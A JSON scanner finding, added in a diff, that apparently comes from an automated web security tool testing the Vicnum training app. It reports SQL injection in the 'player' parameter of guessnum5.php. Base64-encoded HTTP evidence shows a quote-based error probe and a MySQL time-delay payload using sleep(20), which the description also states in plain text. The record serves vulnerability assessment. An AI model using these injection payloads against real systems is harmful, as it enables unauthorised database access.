@@ -1,0 +1,157 @@
+{
+  "name": "SQL injection",
+  "type": "vulnerability",
+  "severity": "High",
+  "confidence": "Certain",
+  "host": "",
+  "path": "/vicnum/guessnum5.php",
+  "url": "/vicnum/guessnum5.php",
+  "evidence": [
+    {
+      "type": "DiffableEvidence",
+      "first_evidence": {
+        "type": "FirstOrderEvidence",
+        "detail": {
+          "payload": {
+            "bytes": "Jw==",
+            "flags": 32
+          },
+          "band_flags": [
+            "in_band"
+          ]
+        },
+        "request_response": {
+          "url": "http://192.168.1.113/vicnum/guessnum5.php",
+          "request": [
+            {
+              "type": "DataSegment",
+              "data": "UE9TVCAvdmljbnVtL2d1ZXNzbnVtNS5waHAgSFRUUC8xLjENCkhvc3Q6IDE5Mi4xNjguMS4xMTMNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KU2VjLUNILVVBOiAiR29vZ2xlIENocm9tZSI7dj0iMTM4IiwgIk5vdD1BP0JyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxMzgiDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KU2VjLUNILVVBLVBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzguMC4wLjAgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29va2llOiBhY29wZW5kaXZpZHM9c3dpbmdzZXQsam90dG8scGhwYmIyLHJlZG1pbmU7IGFjZ3JvdXBzd2l0aHBlcnNpc3Q9bmFkYQ0KT3JpZ2luOiBodHRwOi8vMTkyLjE2OC4xLjExMw0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cDovLzE5Mi4xNjguMS4xMTMvdmljbnVtL2d1ZXNzbnVtLmh0bWwNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogNw0KDQpwbGF5ZXI9",
+              "length": 927
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "Jw==",
+              "length": 1
+            }
+          ],
+          "response": [
+            {
+              "type": "DataSegment",
+              "data": "SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBNb24sIDAxIFNlcCAyMDI1IDIzOjU5OjMxIEdNVA0KU2VydmVyOiBBcGFjaGUvMi4yLjE0IChVYnVudHUpIG1vZF9tb25vLzIuNC4zIFBIUC81LjMuMi0xdWJ1bnR1NC4zMCB3aXRoIFN1aG9zaW4tUGF0Y2ggcHJveHlfaHRtbC8zLjAuMSBtb2RfcHl0aG9uLzMuMy4xIFB5dGhvbi8yLjYuNSBtb2Rfc3NsLzIuMi4xNCBPcGVuU1NMLzAuOS44ayBQaHVzaW9uX1Bhc3Nlbmdlci80LjAuMzggbW9kX3BlcmwvMi4wLjQgUGVybC92NS4xMC4xDQpYLVBvd2VyZWQtQnk6IFBIUC81LjMuMi0xdWJ1bnR1NC4zMA0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpDb250ZW50LUxlbmd0aDogODEwDQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWwNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDCiAgICAgICAgICAgICAgICAgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIgogICAgICAgICAgICAgICAgICJodHRwOi8vd3d3LnczLm9yZy9UUi9odG1sNDAxL2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KICA8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQ=",
+              "length": 599
+            },
+            {
+              "type": "SnipSegment",
+              "length": 331
+            },
+            {
+              "type": "DataSegment",
+              "data": "PGgzPllvdSBoYXZlIHJlcXVlc3RlZCByZXN1bHRzIGZvciBHdWVzc251bSBwbGF5ZXIgJyA6RVJST1IgaW4gU0VMRUNUIG5hbWUsZ3Vlc3MsY291bnQsdG9kIEZST00gZ3Vlc3NudW1yZXN1bHRzIFdIRVJFIG5hbWUgID0gJycnIA==",
+              "length": 130
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "WW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4",
+              "length": 36
+            },
+            {
+              "type": "DataSegment",
+              "data": "OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnJycnJyBhdCBsaW5lIDE=",
+              "length": 113
+            }
+          ],
+          "was_redirect_followed": false,
+          "request_time": "2"
+        }
+      },
+      "second_evidence": {
+        "type": "FirstOrderEvidence",
+        "detail": {
+          "payload": {
+            "bytes": "Jyc=",
+            "flags": 0
+          },
+          "band_flags": [
+            "in_band"
+          ]
+        },
+        "request_response": {
+          "url": "http://192.168.1.113/vicnum/guessnum5.php",
+          "request": [
+            {
+              "type": "DataSegment",
+              "data": "UE9TVCAvdmljbnVtL2d1ZXNzbnVtNS5waHAgSFRUUC8xLjENCkhvc3Q6IDE5Mi4xNjguMS4xMTMNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KU2VjLUNILVVBOiAiR29vZ2xlIENocm9tZSI7dj0iMTM4IiwgIk5vdD1BP0JyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxMzgiDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KU2VjLUNILVVBLVBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzguMC4wLjAgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29va2llOiBhY29wZW5kaXZpZHM9c3dpbmdzZXQsam90dG8scGhwYmIyLHJlZG1pbmU7IGFjZ3JvdXBzd2l0aHBlcnNpc3Q9bmFkYQ0KT3JpZ2luOiBodHRwOi8vMTkyLjE2OC4xLjExMw0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cDovLzE5Mi4xNjguMS4xMTMvdmljbnVtL2d1ZXNzbnVtLmh0bWwNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogNw0KDQpwbGF5ZXI9",
+              "length": 927
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "Jyc=",
+              "length": 2
+            }
+          ],
+          "response": [
+            {
+              "type": "DataSegment",
+              "data": "SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBNb24sIDAxIFNlcCAyMDI1IDIzOjU5OjMxIEdNVA0KU2VydmVyOiBBcGFjaGUvMi4yLjE0IChVYnVudHUpIG1vZF9tb25vLzIuNC4zIFBIUC81LjMuMi0xdWJ1bnR1NC4zMCB3aXRoIFN1aG9zaW4tUGF0Y2ggcHJveHlfaHRtbC8zLjAuMSBtb2RfcHl0aG9uLzMuMy4xIFB5dGhvbi8yLjYuNSBtb2Rfc3NsLzIuMi4xNCBPcGVuU1NMLzAuOS44ayBQaHVzaW9uX1Bhc3Nlbmdlci80LjAuMzggbW9kX3BlcmwvMi4wLjQgUGVybC92NS4xMC4xDQpYLVBvd2VyZWQtQnk6IFBIUC81LjMuMi0xdWJ1bnR1NC4zMA0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpDb250ZW50LUxlbmd0aDogMTAxNQ0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sDQoNCjwhRE9DVFlQRSBIVE1MIFBVQkxJQwogICAgICAgICAgICAgICAgICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIKICAgICAgICAgICAgICAgICAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQwMS9sb29zZS5kdGQiPgo8aHRtbD4KPGhlYWQ+CiAgPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0",
+              "length": 600
+            },
+            {
+              "type": "SnipSegment",
+              "length": 815
+            }
+          ],
+          "was_redirect_followed": false,
+          "request_time": "2"
+        }
+      }
+    },
+    {
+      "type": "TimingBasedEvidence",
+      "evidence": {
+        "type": "FirstOrderEvidence",
+        "detail": {
+          "payload": {
+            "bytes": "Jysoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkrJw==",
+            "flags": 0
+          },
+          "band_flags": [
+            "in_band"
+          ]
+        },
+        "request_response": {
+          "url": "http://192.168.1.113/vicnum/guessnum5.php",
+          "request": [
+            {
+              "type": "DataSegment",
+              "data": "UE9TVCAvdmljbnVtL2d1ZXNzbnVtNS5waHAgSFRUUC8xLjENCkhvc3Q6IDE5Mi4xNjguMS4xMTMNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KU2VjLUNILVVBOiAiR29vZ2xlIENocm9tZSI7dj0iMTM4IiwgIk5vdD1BP0JyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxMzgiDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KU2VjLUNILVVBLVBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzguMC4wLjAgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29va2llOiBhY29wZW5kaXZpZHM9c3dpbmdzZXQsam90dG8scGhwYmIyLHJlZG1pbmU7IGFjZ3JvdXBzd2l0aHBlcnNpc3Q9bmFkYQ0KT3JpZ2luOiBodHRwOi8vMTkyLjE2OC4xLjExMw0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cDovLzE5Mi4xNjguMS4xMTMvdmljbnVtL2d1ZXNzbnVtLmh0bWwNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogNw0KDQpwbGF5ZXI9",
+              "length": 927
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "JyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYic=",
+              "length": 41
+            }
+          ],
+          "response": [
+            {
+              "type": "DataSegment",
+              "data": "SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBNb24sIDAxIFNlcCAyMDI1IDIzOjU5OjMyIEdNVA0KU2VydmVyOiBBcGFjaGUvMi4yLjE0IChVYnVudHUpIG1vZF9tb25vLzIuNC4zIFBIUC81LjMuMi0xdWJ1bnR1NC4zMCB3aXRoIFN1aG9zaW4tUGF0Y2ggcHJveHlfaHRtbC8zLjAuMSBtb2RfcHl0aG9uLzMuMy4xIFB5dGhvbi8yLjYuNSBtb2Rfc3NsLzIuMi4xNCBPcGVuU1NMLzAuOS44ayBQaHVzaW9uX1Bhc3Nlbmdlci80LjAuMzggbW9kX3BlcmwvMi4wLjQgUGVybC92NS4xMC4xDQpYLVBvd2VyZWQtQnk6IFBIUC81LjMuMi0xdWJ1bnR1NC4zMA0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpDb250ZW50LUxlbmd0aDogMTA1MA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sDQoNCjwhRE9DVFlQRSBIVE1MIFBVQkxJQwogICAgICAgICAgICAgICAgICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIKICAgICAgICAgICAgICAgICAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQwMS9sb29zZS5kdGQiPgo8aHRtbD4KPGhlYWQ+CiAgPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0",
+              "length": 600
+            },
+            {
+              "type": "SnipSegment",
+              "length": 850
+            }
+          ],
+          "was_redirect_followed": false,
+          "request_time": "20008"
+        }
+      },
+      "orig_response_completed_timer": "7",
+      "attack_response_completed_timer": "20008"
+    }
+  ],
+  "description": "The <b>player</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the player parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the player parameter. The application took <b>20008</b> milliseconds to respond to the request, compared with <b>7</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.",
+  "remediation": "The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ",
+  "references": []
+}
